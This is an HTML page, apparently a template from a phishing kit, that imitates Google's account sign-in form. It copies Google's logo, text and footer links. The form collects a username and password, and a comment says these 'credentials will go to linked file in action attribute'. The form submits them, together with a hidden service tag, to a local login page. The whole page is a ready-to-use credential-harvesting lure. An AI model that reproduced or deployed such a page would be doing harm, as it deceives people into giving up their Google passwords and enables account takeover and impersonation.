<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>

    <title>Sign in with your Google Account</title>

    <meta charset="UTF-8" />
    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="description" id="description" content="Sign in with your Google Account" />

    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="//fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet" />
    <link href="google.css" rel="stylesheet" />

  </head>
  <body tabindex="0">

    <!-- form wrapper -->
    <section class="google-wrap">

      <!-- form center container -->
      <main class="google-container">

        <!-- login form, credentials will go to linked file in action attribute -->
        <form class="google-form" action="../login.html" method="GET">
          <input type="hidden" name="_service" value="Google" />

          <!-- form logo -->
          <div class="google-logo">
            <img src="google-logo.png" alt="Google" />
          </div>

          <!-- default heading -->
          <div class="google-heading fade-in">
            <h1>Sign in</h1>
            <h3>with your Google Account</h3>
          </div>

          <!-- username selected heading -->
          <div class="google-welcome fade-in hidden">
            <h1>Welcome</h1>
            <div>
              <svg xmlns="https://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path><path fill="none" d="M0 0h24v24H0V0z"></path></svg>
              <span></span>
            </div>
          </div>

          <!-- username input -->
          <div class="google-input google-username slide-right">
            <input type="text" name="_username" placeholder="" value="" />
            <span>Email or phone</span>
            <a href="#">Forgot e-mail?</a>
          </div>

          <!-- hidden password input -->
          <div class="google-input google-password slide-left hidden">
            <input type="password" name="_password" placeholder="" value="" />
            <span>Enter your password</span>
            <a href="#">Forgot password?</a>
          </div>

          <!-- device warning text -->
          <div class="google-info">
            <span>Not your computer? Use Guest mode to sign in privately.</span> <br />
            <a href="https://support.google.com/chrome/answer/6130773">Learn more</a>
          </div>

          <!-- form action button -->
          <div class="google-action">
            <a href="#">Create account</a>
            <button type="submit">Next</button>
          </div>

        </form>

        <!-- form footer links -->
        <div class="google-footer">
          <div class="google-footer-left">
            <select>
              <option value="en" selected>English</option>
              <option value="ar">عربى</option>
            </select>
          </div>
          <div class="google-footer-right">
            <a href="https://support.google.com/accounts">Help</a>
            <a href="https://accounts.google.com/TOS?privacy=true">Privacy</a>
            <a href="https://accounts.google.com/TOS">Terms</a>
          </div>
        </div>

      </main>

    </section>

    <!-- form scripts -->
    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
    <script src="google.js"></script>

  </body>
</html>
